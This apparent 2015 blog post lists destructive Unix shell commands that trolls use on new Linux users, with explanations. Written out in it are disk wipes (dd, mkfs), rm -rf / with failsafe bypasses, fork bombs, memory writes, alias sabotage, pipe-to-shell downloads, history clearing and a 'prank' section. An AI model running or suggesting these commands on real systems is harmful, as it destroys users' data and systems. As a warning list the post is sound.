---

title: Devil's Commands
slug: devils-commands
date: 2015-10-31
---
![Commands - Doomsday Commands]({{ site.baseurl }}/assets/img/doomsday-commands.jpg)

### List of dangerous shell commands
It is not uncommon to see trolls tricking new Linux/Unix users run commands as a joke. These commands can destroy users data. Here are a few:

1. rm -rf /
2. :(){ :|: & };:
3. mkfs /dev/sda1 
4. cat /dev/zero > /dev/sda1
5. wget url -O - | sh --
6. curl url | sh
7. dd if=/dev/zero of=/dev/sda2
8. echo 726d202d7266202a | xxd -r -p
9. dd if=/dev/random of=/dev/port
10. echo 1 > /proc/sys/kernel/panic
11. cat /dev/port or cat /dev/mem
12. cat /dev/zero > /dev/mem
13. sudo chmod -r 444 / or sudo chown -r nobody:nobody /
14. last | reboot

#### Explanations

1. rm -rf /
Doesn't work anymore. Don't bother. Used to remove all files in the directory tree.
2. :(){ :|: & };:
Fork bomb. Job control has partially mitigated this by now. It won't fully bork up the system anymore.
3. mkfs /dev/sda1
Formats first partition on sda disk.
4. cat /dev/zero > /dev/sda1
Zeroes out the first partition (many systems host either / or /boot there). Using sda might've been better.
5. wget url -O - | sh --
Grab arbitrary shell script from online and execute it.
6. curl url | sh
Deviation of 5.
7. dd if=/dev/zero of=/dev/sda2
Zeroes out sda2. Just like 4 it kinda sucks. It assumes the existence of that partition.
8. echo 726d202d7266202a | xxd -r -p
Doesn't do jack shit unless put inside $( ). It just echoes rm -rf *.
9. dd if=/dev/random of=/dev/port
Write random stuff to memory. Better use urandom instead.
10. echo 1 > /proc/sys/kernel/panic
Induce kernel panic.
11. cat /dev/port or cat /dev/mem
View system memory.
12. cat /dev/zero > /dev/mem
Write zero bits into system memory.
13. sudo chmod -r 444 / or sudo chown -r nobody:nobody /
Make all files on system read-only and pass their ownership to nobody user.
14. last | reboot
View last logged in users and send its output to reboot? What kinda bullshit is that?

So, newb commands mostly. Learn from any source but not these shitty commands please _/\_

A few common ways to mess with people is

- Creating/changing the `alias` for a command to something else
- Running a script that is not on the system (remotely) with `curl` or `wget`
- Overwriting/Deleting directories/partitions `dd`, `mkfs`
- Fork bombs
- Mess with permissions so you/none can get access

#### Delete the root directory `/`
In Linux system, everything is a file. And all files live under the root directory, the path for which is `/`. `rm -rf /` force deletes the root directory, basically deleting everything you have on the system.


Built-in failsafe has been implemented since 2006. This one is one of those myths that just does not die.

You can circumvent the `--no-preserve-root` failsafe by doing `rm -rf /*` instead. An empty root directory is no more useful than a deleted root directory.

That failsafe is likely only in GNU rm. The list is for Linux and "Unix-like" systems, not all of which will have this failsafe.

is mostly only doable with `/*` instead of `/` now, due to the `--no-preserve-root` failsafe

```bash
sudo rm -rf / --no-preserve-root
sudo rm -rf /*
```

```bash
echo 726d202d7266202a | xxd -r -p
```

It just echoes "rm -rf *".  This won't do any harm, unless you put it in `$()` or backticks.


#### Fork bomb

```bash
:(){ :|: & };:
```
 It's called a _forkbomb_. `:()` defines a function called `:` with the body of `:|:&`, meaning _run : and also run : in the background_. `;` ends the function definition, and `:` calls your new function, which endlessly spawns new versions of itself until you either hit process limits or the system grinds to a halt. It's a command that effectively freezes any system without good process limits set. Don't try this at home.

Here's a modified fork bomb

```bash
#!/bin/bash
fatfork() {
fatfork|fatfork&
od -v /dev/random > ~/.$RANDOM.txt
}; fatfork
```

You're likely to get 


```
 bash: fork: retry: No child process.
```

It's a fork bomb- So, basically you ran yourself out of available processid

 a forkbomb works mainly in memory, it will not affect the data and, if defused it will not affect the system once rebooted, no data loss or system corruption
 
#### Run remote scripts
 it'd have to be this new trend of software projects asking users to do this: 

```bash
curl http://example.com/install | sudo /bin/bash
```

`wget url -O - | sh --` and `curl url | sh` are two ways of doing the same thing


#### Kernel Panic
 
```bash
echo 1 > /proc/sys/kernel/panic
```

The value in `/proc/sys/kernel/panic` file represents the number of seconds the kernel waits before automatically rebooting on a panic. If this is zero, the kernel will loop on a panic; if nonzero it indicates that the kernel should autoreboot after this number of seconds. When you use the software watchdog,
the recommended setting is 60. [man sysctl](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt)



```bash
last | reboot
```
It will reboot your system. It's just a common mistake people make when trying to see when the system was last rebooted, because they omit the intended `grep` command. "last reboot" is safer than grepping for reboot for that reason.

 luckily "reboot" hasn't blindly rebooted your machine immediately with no warning for about 25 years

is a common mistake: omission of grep before reboot. Easily avoided if you remember that last will take a username. If grepping for reboot in any other case, be very careful not to accidentally omit the grep command.

---

```bash
alias cd=rm -rf 	  # changing to a directory will delete that directory

alias alias="poweroff" 

alias sudo=""

alias sudo="fuck"

dd if=/dev/zero of=/empty

cat /dev/urandom

cat /dev/urandom | hexdump | grep "ca fe"

passwd | /dev/random

alias vim="shutdown now"
alias cd="rm"    
alias alias="alias"

alias alias="echo *** you troller get off mah lawn"

dd if=/dev/urandom of=/dev/sda bs=4096

sudo dd if=/dev/urandom of=/dev/sda bs=4M && sync

dd if=/dev/urandom of=/dev/sda

dd if=/dev/urandom of=/dev/sda bs=8m

alias clear='cat /dev/urandom'

:(){ :|:& };:

7:56Doubleblock: l33t plan: dd if=/dev/urandom of=/dev/sda reality: dsifjwdbdwbv

fdisk /dev/sda d, 1, q

kill -9 -1
```

#### get an .sh file that would do everything for us if we just curl it from the web, 

    curl aaa.xyz/a.sh | bash

- 7:08inluck_nl: write a bash script
- 7:08inluck_nl: host it
- 7:08inluck_nl: get networking up
- 7:08inluck_nl: wget and run

write a script we can `wget | sudo sh`



- Rm -f /etc/passwd(this kicks out some really neat errors)


Funny prank

```bash
for i in ls /usr/bin
do
alias $i='echo nope'
done
```

bash_history

`. .bash_history` or add `history - c` at the end..


 - cat /dev/urandom > /dev/mouse
 - pkill ssh
 - echo "oh shit" > /boot/grub2/grub.cfg ; reboot
 - cat /proc/kcore > /dev/dsp
 - cat /dev/sda1 > /dev/tty0
 -  Iptables -F
 - sudo startx &
 -  [ $[ $RANDOM % 2 ] == 0 ] && dd if=/dev/urandom of=/dev/sda || echo 'Meow'
### Notes
These were inspired from TwitchInstallArchLinux chat.

### Links
- [List of dangerous shell commands](https://docs.google.com/forms/d/e/1FAIpQLSfTwnopvY7UYcSf-1QOkHTFUkow4mPeuses7ibDRAxPs7BptQ/viewform)
- [comments on this nixCraft facebook msg](https://web.facebook.com/plugins/post.php?href=https%3A%2F%2Fweb.facebook.com%2Fnixcraft%2Fposts%2F1776674342345936)
- [nixCraft: My 10 UNIX Command Line Mistakes](https://www.cyberciti.biz/tips/my-10-unix-command-line-mistakes.html?utm_source=facebook)
